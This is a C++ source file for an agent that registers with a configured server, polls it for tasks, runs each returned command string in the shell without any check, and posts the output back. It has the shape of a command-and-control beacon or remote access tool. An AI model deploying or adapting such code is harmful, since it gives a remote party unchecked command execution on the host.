#include "agent.h"
#include "utils.h"
#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <httplib.h>
#include <thread>
#include <fstream>

WebAgent::WebAgent(const std::string& config_path) {
    std::ifstream f(config_path);
    json conf = json::parse(f);
    uid = conf["uid"];
    server_url = conf["server_url"];
    interval = conf["interval_ms"];
    tasks_dir = conf["tasks_dir"];
    results_dir = conf["results_dir"];
}

void WebAgent::run() {
    utils::log("Agent started. UID: " + uid);

    while (!register_on_server()) {
        utils::log("Registration failed. Retrying...");
        std::this_thread::sleep_for(std::chrono::milliseconds(interval * 2));
    }

    while (true) {
        poll_tasks();
        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
    }
}

bool WebAgent::register_on_server() {
    httplib::Client cli(server_url);
    json body = {{"uid", uid}, {"action", "register"}};

    if (auto res = cli.Post("/register", body.dump(), "application/json")) {
        if (res->status == 200) {
            auto j_res = json::parse(res->body);
            session_id = j_res["session_id"];
            return true;
        }
    }
    return false;
}

void WebAgent::poll_tasks() {
    httplib::Client cli(server_url);
    if (auto res = cli.Get("/get_task?uid=" + uid + "&session=" + session_id)) {
        if (res->status == 200 && !res->body.empty()) {
            execute_task(json::parse(res->body));
        }
    }
}

void WebAgent::execute_task(const json& task) {
    std::string cmd = task["command"];
    std::string task_id = task["task_id"];

    utils::log("Executing: " + cmd);
    std::string output = utils::execute_command(cmd);

    send_result(task_id, output, "completed");
}

void WebAgent::send_result(const std::string& task_id, const std::string& output, const std::string& status) {
    httplib::Client cli(server_url);
    json res_body = {
        {"uid", uid},
        {"task_id", task_id},
        {"status", status},
        {"output", output}
    };
    cli.Post("/result", res_body.dump(), "application/json");
}
